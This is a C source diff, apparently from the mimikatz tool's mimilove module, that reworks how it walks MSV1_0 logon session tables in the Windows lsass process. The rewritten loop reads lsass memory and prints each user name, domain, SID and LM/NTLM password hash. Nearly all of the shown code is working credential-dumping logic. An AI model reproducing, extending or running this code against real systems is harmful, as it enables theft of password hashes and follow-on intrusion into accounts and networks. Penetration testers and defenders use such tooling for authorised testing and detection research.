@@ -86,13 +86,14 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miLsasrv;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &hLocalMemory};
-	PVOID base;
+	PVOID baseTable, base;
 	KIWI_MSV1_0_LOGON_SESSION_TABLE_50 table;
 	KIWI_MSV1_0_LIST_50 list;
 	KIWI_MSV1_0_ENTRY_50 entry;
 	KIWI_MSV1_0_CREDENTIALS credentials;
 	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 	PMSV1_0_PRIMARY_CREDENTIAL_50 pPrimaryCred;
+	DWORD tableCount = 0, i;
 
 	kprintf(L"========================================\n"
 		L"LSASRV Credentials (MSV1_0, ...)\n"
@@ -112,123 +113,143 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 					aLocalMemory.address = &table;
 					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50)))
 					{
-						base = (PBYTE) aLsassMemory.address + FIELD_OFFSET(KIWI_MSV1_0_LOGON_SESSION_TABLE_50, list);
-						if(aLsassMemory.address = table.list.Flink)
+						if(table.tag == 'XTHL')
 						{
-							while(aLsassMemory.address != base)
+							tableCount = 16;
+							baseTable = (PBYTE) aLsassMemory.address + sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50);
+						}
+						else if(table.tag == 'XTHS')
+						{
+							tableCount = 1;
+							baseTable = aLsassMemory.address;
+						}
+						else PRINT_ERROR(L"unknown table tag\n");
+					}
+					
+					for(i = 0; i < tableCount ; i++)
+					{
+						aLsassMemory.address = (PBYTE) baseTable + i * sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50);
+						aLocalMemory.address = &table;
+						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50)))
+						{
+							base = (PBYTE) aLsassMemory.address + FIELD_OFFSET(KIWI_MSV1_0_LOGON_SESSION_TABLE_50, list);
+							if(aLsassMemory.address = table.list.Flink)
 							{
-								aLocalMemory.address = &list;
-								if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LIST_50)))
+								while(aLsassMemory.address != base)
 								{
-									if(aLsassMemory.address = list.entry)
+									aLocalMemory.address = &list;
+									if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LIST_50)))
 									{
-										aLocalMemory.address = &entry;
-										if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_ENTRY_50)))
+										if(aLsassMemory.address = list.entry)
 										{
-											if(aLsassMemory.address = entry.Credentials)
+											aLocalMemory.address = &entry;
+											if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_ENTRY_50)))
 											{
-												kull_m_string_getUnicodeString(&entry.UserName, hMemory);
-												kull_m_string_getUnicodeString(&entry.Domaine, hMemory);
-												kull_m_string_getSid(&entry.pSid, hMemory);
-
-												kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
-													L"Session           : %s from %u\n"
-													L"User Name         : %wZ\n"
-													L"Domain            : %wZ\n"
-													, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[entry.LogonType], entry.Session, &entry.UserName, &entry.Domaine);
-												kprintf(L"Logon Time        : ");
-												kull_m_string_displayLocalFileTime(&entry.LogonTime);
-												kprintf(L"\nSID               : ");
-												if(entry.pSid)
-													kull_m_string_displaySID(entry.pSid);
-												kprintf(L"\n");
-
-												if(entry.UserName.Buffer)
-													LocalFree(entry.UserName.Buffer);
-												if(entry.Domaine.Buffer)
-													LocalFree(entry.Domaine.Buffer);
-												if(entry.pSid)
-													LocalFree(entry.pSid);
-
-												while(aLsassMemory.address)
+												if(aLsassMemory.address = entry.Credentials)
 												{
-													aLocalMemory.address = &credentials;
-													if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
-													{
-														if(aLsassMemory.address = credentials.PrimaryCredentials)
-														{
-															while(aLsassMemory.address)
-															{
-																aLocalMemory.address = &primaryCredentials;
-																if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
-																{
-																	kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
-																	kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
+													kull_m_string_getUnicodeString(&entry.UserName, hMemory);
+													kull_m_string_getUnicodeString(&entry.Domaine, hMemory);
+													kull_m_string_getSid(&entry.pSid, hMemory);
 
-																	kprintf(L"\t[%Z]\n", &primaryCredentials.Primary);
-																	if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
+													kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
+														L"Session           : %s from %u\n"
+														L"User Name         : %wZ\n"
+														L"Domain            : %wZ\n"
+														, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[entry.LogonType], entry.Session, &entry.UserName, &entry.Domaine);
+													kprintf(L"Logon Time        : ");
+													kull_m_string_displayLocalFileTime(&entry.LogonTime);
+													kprintf(L"\nSID               : ");
+													if(entry.pSid)
+														kull_m_string_displaySID(entry.pSid);
+													kprintf(L"\n");
+
+													if(entry.UserName.Buffer)
+														LocalFree(entry.UserName.Buffer);
+													if(entry.Domaine.Buffer)
+														LocalFree(entry.Domaine.Buffer);
+													if(entry.pSid)
+														LocalFree(entry.pSid);
+
+													while(aLsassMemory.address)
+													{
+														aLocalMemory.address = &credentials;
+														if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
+														{
+															if(aLsassMemory.address = credentials.PrimaryCredentials)
+															{
+																while(aLsassMemory.address)
+																{
+																	aLocalMemory.address = &primaryCredentials;
+																	if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
 																	{
-																		pPrimaryCred = (PMSV1_0_PRIMARY_CREDENTIAL_50) primaryCredentials.Credentials.Buffer;
-																		kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->UserName, FALSE);
-																		kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->LogonDomainName, FALSE);
-																		kprintf(L"\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCred->UserName, &pPrimaryCred->LogonDomainName);
-																		if(pPrimaryCred->isLmOwfPassword)
+																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
+																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
+
+																		kprintf(L"\t[%Z]\n", &primaryCredentials.Primary);
+																		if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
 																		{
-																			kprintf(L"\n\t * LM       : ");
-																			kull_m_string_wprintf_hex(pPrimaryCred->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+																			pPrimaryCred = (PMSV1_0_PRIMARY_CREDENTIAL_50) primaryCredentials.Credentials.Buffer;
+																			kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->UserName, FALSE);
+																			kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->LogonDomainName, FALSE);
+																			kprintf(L"\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCred->UserName, &pPrimaryCred->LogonDomainName);
+																			if(pPrimaryCred->isLmOwfPassword)
+																			{
+																				kprintf(L"\n\t * LM       : ");
+																				kull_m_string_wprintf_hex(pPrimaryCred->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+																			}
+																			if(pPrimaryCred->isNtOwfPassword)
+																			{
+																				kprintf(L"\n\t * NTLM     : ");
+																				kull_m_string_wprintf_hex(pPrimaryCred->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+																			}
+																			kprintf(L"\n");
 																		}
-																		if(pPrimaryCred->isNtOwfPassword)
+																		else
 																		{
-																			kprintf(L"\n\t * NTLM     : ");
-																			kull_m_string_wprintf_hex(pPrimaryCred->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+																			kull_m_string_wprintf_hex(primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.Length, 1 | (16 << 16));
 																		}
-																		kprintf(L"\n");
+
+																		if(primaryCredentials.Primary.Buffer)
+																			LocalFree(primaryCredentials.Primary.Buffer);
+																		if(primaryCredentials.Credentials.Buffer)
+																			LocalFree(primaryCredentials.Credentials.Buffer);
+
+																		aLsassMemory.address = primaryCredentials.next;
 																	}
 																	else
 																	{
-																		kull_m_string_wprintf_hex(primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.Length, 1 | (16 << 16));
+																		PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_PRIMARY_CREDENTIALS");
+																		break;
 																	}
-
-																	if(primaryCredentials.Primary.Buffer)
-																		LocalFree(primaryCredentials.Primary.Buffer);
-																	if(primaryCredentials.Credentials.Buffer)
-																		LocalFree(primaryCredentials.Credentials.Buffer);
-
-																	aLsassMemory.address = primaryCredentials.next;
-																}
-																else
-																{
-																	PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_PRIMARY_CREDENTIALS");
-																	break;
 																}
 															}
+															aLsassMemory.address = credentials.next;
 														}
-														aLsassMemory.address = credentials.next;
+														else
+														{
+															PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_CREDENTIALS");
+															break;
+														}
 													}
-													else
-													{
-														PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_CREDENTIALS");
-														break;
-													}
+													kprintf(L"\n");
 												}
-												kprintf(L"\n");
 											}
+											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_ENTRY_50");
 										}
-										else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_ENTRY_50");
+										else PRINT_ERROR(L"list.entry is NULL\n");
+										aLsassMemory.address = list.Flink;
 									}
-									else PRINT_ERROR(L"list.entry is NULL\n");
-									aLsassMemory.address = list.Flink;
-								}
-								else
-								{
-									PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LIST_50");
-									break;
+									else
+									{
+										PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LIST_50");
+										break;
+									}
 								}
 							}
+							else PRINT_ERROR(L"table.list is NULL\n");
 						}
-						else PRINT_ERROR(L"table.list is NULL\n");
+						else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LOGON_SESSION_TABLE_50");
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LOGON_SESSION_TABLE_50");
 				}
 				else PRINT_ERROR(L"LogonSessionTable is NULL\n");
 			}
